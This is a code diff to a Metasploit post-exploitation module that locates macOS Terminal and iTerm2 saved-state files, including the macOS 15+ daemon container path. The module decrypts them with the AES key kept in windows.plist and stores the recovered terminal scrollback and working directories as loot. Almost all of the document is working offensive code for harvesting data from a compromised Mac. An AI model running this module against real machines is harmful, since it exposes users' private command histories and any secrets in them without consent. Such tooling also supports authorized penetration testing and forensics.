@@ -5,6 +5,7 @@
 
 require 'openssl'
 require 'json'
+require 'shellwords'
 
 # Binary plist parser ported from bplist.py by Willi Ballenthin
 # https://gist.github.com/williballenthin/ab23abd5eec5bf5a272bfcfb2342ec04
@@ -13,6 +14,7 @@ require 'json'
 #   null, bool, int, real, date, data, ASCII/Unicode string, UID, array, dict
 class BplistParser
   MAGIC = 'bplist00'.b.freeze
+  UID = Struct.new(:value)
 
   class ParseError < StandardError; end
 
@@ -38,7 +40,7 @@ class BplistParser
     read_object(top_object)
   rescue ParseError
     raise
-  rescue IndexError, TypeError, ArgumentError, RangeError => e
+  rescue IndexError, TypeError, ArgumentError, RangeError, NoMethodError => e
     raise ParseError, "Parse failed: #{e}"
   end
 
@@ -107,8 +109,8 @@ class BplistParser
               pos, s = resolve_count(pos, token_l)
               @buf[pos, s * 2].encode('UTF-8', 'UTF-16BE', invalid: :replace, undef: :replace)
 
-            when 0x80 # UID — store as plain integer
-              @buf[pos, 1 + token_l].unpack('C*').reduce(0) { |acc, b| (acc << 8) | b }
+            when 0x80 # UID must remain distinct from an ordinary integer
+              UID.new(@buf[pos, 1 + token_l].unpack('C*').reduce(0) { |acc, byte| (acc << 8) | byte })
 
             when 0xA0 # array
               pos, s = resolve_count(pos, token_l)
@@ -152,7 +154,8 @@ class MetasploitModule < Msf::Post
         'Name' => 'macOS Terminal/iTerm2 Saved State Recovery',
         'Description' => %q{
           This module enumerates the saved state files for the Terminal and iTerm2
-          applications on macOS 10.7-12 (Lion through Monterey).
+          applications on macOS 10.7-14, and Terminal's daemon container saved
+          state on macOS 15 and later (requires Full Disk Access).
           These files are encrypted with AES-128-CBC, but
           the key is stored in plaintext in the accompanying windows.plist file.
           The decrypted files contain a copy of what was sent to and from the
@@ -196,11 +199,48 @@ class MetasploitModule < Msf::Post
     BplistParser.new(data).parse
   end
 
+  def terminal_container_paths(user)
+    paths = []
+    containers = "/Users/#{user}/Library/Daemon Containers"
+    return paths unless directory?(containers)
+
+    # Full Disk Access is required to read the macOS 15+ daemon container path.
+    directory = session.type == 'meterpreter' ? containers : Shellwords.escape(containers)
+    dir(directory).each do |container|
+      next if ['.', '..'].include?(container)
+
+      saved_state = "#{containers}/#{container}/Data/Library/Saved Application State"
+      mapping_file = "#{saved_state}/ApplicationMapping.plist"
+      next unless file?(mapping_file)
+
+      begin
+        mapping = parse_binary_plist(read_file(mapping_file))
+        next unless mapping.is_a?(Array)
+
+        # The flat array alternates an application dictionary and its saved-state UUID.
+        mapping.each_slice(2) do |application, uuid|
+          next unless application.is_a?(Hash) && application['protected'].is_a?(Hash)
+          next unless application['protected']['signingIdentifier'] == 'com.apple.Terminal'
+          next unless uuid.is_a?(String) && !uuid.empty?
+
+          paths << "#{saved_state}/#{uuid}.savedState"
+        end
+      rescue StandardError => e
+        vprint_warning("Unable to read #{mapping_file}: #{e}")
+      end
+    end
+    paths.uniq
+  rescue StandardError => e
+    vprint_warning("Unable to enumerate #{containers} (Full Disk Access may be required): #{e}")
+    paths
+  end
+
   # Recursively converts parsed plist values to JSON-safe types.
   # Binary strings become "hex://..." since they may not be valid UTF-8.
   # Time objects become ISO-8601 strings. Everything else maps directly.
   def plist_to_json_value(obj)
     case obj
+    when BplistParser::UID then { 'CF$UID' => obj.value }
     when Hash then obj.transform_values { |v| plist_to_json_value(v) }
     when Array then obj.map { |v| plist_to_json_value(v) }
     when String
@@ -214,10 +254,14 @@ class MetasploitModule < Msf::Post
     cipher = OpenSSL::Cipher.new('AES-128-CBC')
     cipher.decrypt
     cipher.key = key
+    # The undocumented IV is all zero bytes; a random IV corrupts block 0.
     cipher.iv = iv
     cipher.padding = 0
     cipher.update(ciphertext) + cipher.final
   end
+
+  # A recognized _NSWindow record must supersede earlier state even if its envelope is invalid.
+  class WindowEnvelopeError < BplistParser::ParseError; end
 
   # Parses the custom struct wrapping the NSKeyedArchiver bplist inside a decrypted window state.
   #
@@ -229,23 +273,32 @@ class MetasploitModule < Msf::Post
   #   uint32_t plist_size
   #   uint8_t  plist[plist_size]
   #
-  # Returns the raw bplist bytes, or nil if the magic is wrong.
+  # Returns the raw bplist bytes, or nil for a key other than _NSWindow.
   def parse_window_header(buf)
     buf = buf.b
+    raise BplistParser::ParseError, 'Truncated window envelope' if buf.bytesize < 16
+
     _unk1, class_name_size = buf.unpack('NN')
-    offset = 8
-    offset += class_name_size
+    offset = 8 + class_name_size
+    raise BplistParser::ParseError, 'Truncated window envelope key' if offset > buf.bytesize
+    return nil unless buf[8, class_name_size] == '_NSWindow'
+
+    raise WindowEnvelopeError, 'Truncated window envelope fields' if offset + 8 > buf.bytesize
+
     magic = buf[offset, 4]
     offset += 4
-    return nil unless magic == 'rchv'
+    raise WindowEnvelopeError, 'Invalid window envelope tag' unless magic == 'rchv'
 
     plist_size = buf[offset, 4].unpack1('N')
     offset += 4
+    raise WindowEnvelopeError, 'Truncated window envelope plist' if plist_size > buf.bytesize - offset
+
     buf[offset, plist_size]
   end
 
   # Parses one NSCR window state blob, finds its decryption key in windows_meta,
   # decrypts it, and returns [size, window_meta, inner_plist_bytes].
+  # Returns [size, window_meta, nil, error] for a recognized but malformed _NSWindow envelope.
   # Returns [size, nil, nil] if the window metadata is missing.
   # Returns nil if the magic/version is invalid.
   def decrypt_window(windows_meta, buf)
@@ -267,22 +320,123 @@ class MetasploitModule < Msf::Post
     key = window['NSDataKey']
     plaintext = aes128_cbc_decrypt(key, ciphertext)
     plist_bytes = parse_window_header(plaintext)
+    vprint_status("  Skipping non-_NSWindow record for window ID #{window_id}") unless plist_bytes
 
     [size, window, plist_bytes]
+  rescue WindowEnvelopeError => e
+    [size, window, nil, e.message]
+  rescue OpenSSL::Cipher::CipherError, ArgumentError, BplistParser::ParseError => e
+    vprint_warning("  Failed to decrypt record for window ID #{window_id}: #{e}")
+    [size, nil, nil]
   end
 
-  # Extracts terminal scrollback content from a parsed NSKeyedArchiver plist.
-  # $objects[33+] holds the terminal line strings per the SavedState format.
-  # Terminal lines are stored as NSData (binary, ASCII_8BIT encoding).
-  # Metadata strings (window geometry, class names, etc.) are NSString (UTF-8).
-  def extract_terminal_content(state)
-    objects = state['$objects']
-    return nil if objects.nil? || objects.length <= 32
+  # NSCR1000 records include their 16-byte header in the total length.
+  # Select the last _NSWindow record for each ID before parsing any archives.
+  # Retain malformed candidates until selection ends so older state cannot become current.
+  def latest_window_records(windows_meta, data)
+    records = {}
+    pos = 0
+    while pos < data.bytesize
+      if data.bytesize - pos < 16
+        print_warning("  Torn final record header at offset #{pos}; stopping")
+        break
+      end
+      unless data[pos, 8] == 'NSCR1000'
+        print_warning("  Invalid record header at offset #{pos}; stopping")
+        break
+      end
 
-    content = objects[33..].select { |o| o.is_a?(String) && o.encoding == ::Encoding::ASCII_8BIT }
-                           .map { |s| s.encode('UTF-8', 'ASCII-8BIT', invalid: :replace, undef: :replace) }
-                           .join
-    content.sub(/(\[Process completed\]\n).*/m, '\1')
+      window_id, size = data[pos + 8, 8].unpack('NN')
+      if size <= 16
+        print_warning("  Invalid record length #{size} at offset #{pos}; stopping")
+        break
+      end
+      if size > data.bytesize - pos
+        print_warning("  Torn final record for window ID #{window_id} at offset #{pos}; stopping")
+        break
+      end
+
+      _size, window, plist_bytes, error = decrypt_window(windows_meta, data[pos, size])
+      if window && (plist_bytes || error)
+        previous = records[window_id]
+        if previous
+          vprint_status("  Window ID #{window_id}: choosing _NSWindow record at offset #{pos}; skipping earlier record at offset #{previous[:offset]}")
+        end
+        records[window_id] = { window: window, plist_bytes: plist_bytes, offset: pos, error: error }
+      end
+      pos += size
+    end
+    records.delete_if do |window_id, record|
+      next false unless record[:error]
+
+      print_warning("  Window ID #{window_id}: newest _NSWindow state at offset #{record[:offset]} was malformed (#{record[:error]}); skipping window")
+      true
+    end
+  end
+
+  # Resolve only typed UIDs through $objects; ordinary integers are values.
+  def resolve_archive_value(value, objects, resolved = {})
+    case value
+    when BplistParser::UID
+      index = value.value
+      return nil if index.zero?
+      raise BplistParser::ParseError, "Invalid archive UID #{index}" unless index.between?(0, objects.length - 1)
+      return resolved[index] if resolved.key?(index)
+
+      resolved[index] = nil # Break cycles in the archived object graph.
+      resolved[index] = resolve_archive_value(objects[index], objects, resolved)
+    when Array
+      value.map { |entry| resolve_archive_value(entry, objects, resolved) }
+    when Hash
+      if value.key?('NS.keys')
+        keys = resolve_archive_value(value['NS.keys'], objects, resolved)
+        values = resolve_archive_value(value['NS.objects'], objects, resolved)
+        unless keys.is_a?(Array) && values.is_a?(Array) && keys.length == values.length
+          raise BplistParser::ParseError, 'Invalid archived NSDictionary'
+        end
+
+        keys.zip(values).to_h
+      elsif value.key?('NS.objects')
+        resolve_archive_value(value['NS.objects'], objects, resolved)
+      elsif value.key?('NS.string')
+        resolve_archive_value(value['NS.string'], objects, resolved)
+      elsif value.key?('NS.data')
+        resolve_archive_value(value['NS.data'], objects, resolved)
+      else
+        value.reject { |key, _entry| key == '$class' }.transform_values { |entry| resolve_archive_value(entry, objects, resolved) }
+      end
+    else
+      value
+    end
+  end
+
+  # Follow $top -> TTWindowState -> Window Settings, preserving tab boundaries.
+  def extract_terminal_tabs(state)
+    objects = state['$objects']
+    return [] unless objects.is_a?(Array)
+
+    top = resolve_archive_value(state['$top'], objects)
+    return [] unless top.is_a?(Hash)
+
+    # Archives may put the TTWindowState dictionary beneath the standard root key.
+    root = top['root'] || top
+    return [] unless root.is_a?(Hash)
+
+    window_state = root['TTWindowState']
+    return [] unless window_state.is_a?(Hash) && window_state['Window Settings'].is_a?(Array)
+
+    window_state['Window Settings'].each_with_object([]) do |tab, tabs|
+      next unless tab.is_a?(Hash)
+
+      rows = tab['Tab Contents v2']
+      next unless rows.is_a?(Array)
+
+      # Odd entries are 16-byte attribute runs, even when a row is also 16 bytes.
+      content = rows.each_slice(2).map do |row, _attributes|
+        row.is_a?(String) ? row.dup.force_encoding('UTF-8').scrub : ''
+      end.join
+      tabs << { content: content, working_directory: tab['Tab Working Directory URL String'] }
+    end
   end
 
   def process_saved_state(path)
@@ -298,30 +452,21 @@ class MetasploitModule < Msf::Post
 
     windows_meta = parse_binary_plist(read_file(windows_plist))
     data = read_file(data_file).b
-    pos = 0
-
-    while pos <= data.length - 0x10
-      break unless data[pos, 4] == 'NSCR'
-
-      result = decrypt_window(windows_meta, data[pos..])
-      break if result.nil?
-
-      size, window, plist_bytes = result
-      break if size.nil? || size <= 0x10
-
-      pos += size
-      next if plist_bytes.nil? || window.nil?
-
+    latest_window_records(windows_meta, data).each do |window_id, record|
+      window = record[:window]
       title = window.fetch('NSTitle', '(no title)')
       vprint_status("  Window: #{title}")
 
       begin
-        state = parse_binary_plist(plist_bytes)
+        state = parse_binary_plist(record[:plist_bytes])
         state_json = JSON.pretty_generate(plist_to_json_value(state))
+        tabs = extract_terminal_tabs(state)
       rescue BplistParser::ParseError, JSON::GeneratorError => e
-        vprint_error("  Failed to process window plist: #{e}")
+        print_warning("  Window ID #{window_id}: newest _NSWindow state at offset #{record[:offset]} was malformed (#{e}); skipping window")
         next
       end
+
+      vprint_status("  Using last _NSWindow record for window ID #{window_id} at offset #{record[:offset]}")
 
       loot_json = store_loot(
         'osx.terminal.window.json',
@@ -333,21 +478,25 @@ class MetasploitModule < Msf::Post
       )
       vprint_status("  Stored window state JSON to: #{loot_json}")
 
-      content = extract_terminal_content(state)
-      next if content.nil? || content.empty?
+      tabs.each_with_index do |tab, index|
+        content = tab[:content]
+        next if content.empty?
 
-      print_good("  Recovered terminal history for window: #{title}")
-      print_status(content)
+        print_good("  Recovered terminal history for window: #{title}, tab #{index + 1}")
+        directory = tab[:working_directory]
+        print_status("  Working directory: #{directory}") if directory
+        print_status(content)
 
-      loot = store_loot(
-        'osx.terminal.history',
-        'text/plain',
-        session,
-        content,
-        'terminal_history.txt',
-        "macOS terminal history - #{title}"
-      )
-      print_good("  Stored to: #{loot}")
+        loot = store_loot(
+          'osx.terminal.history',
+          'text/plain',
+          session,
+          content,
+          'terminal_history.txt',
+          "macOS terminal history - #{title}, tab #{index + 1} (#{directory})"
+        )
+        print_good("  Stored to: #{loot}")
+      end
     end
   rescue BplistParser::ParseError => e
     print_error("Failed to parse #{windows_plist}: #{e}")
@@ -364,6 +513,7 @@ class MetasploitModule < Msf::Post
       SAVED_STATE_APPS.each do |app|
         process_saved_state("/Users/#{user}/Library/Saved Application State/#{app}")
       end
+      terminal_container_paths(user).each { |path| process_saved_state(path) }
     end
   end
 end
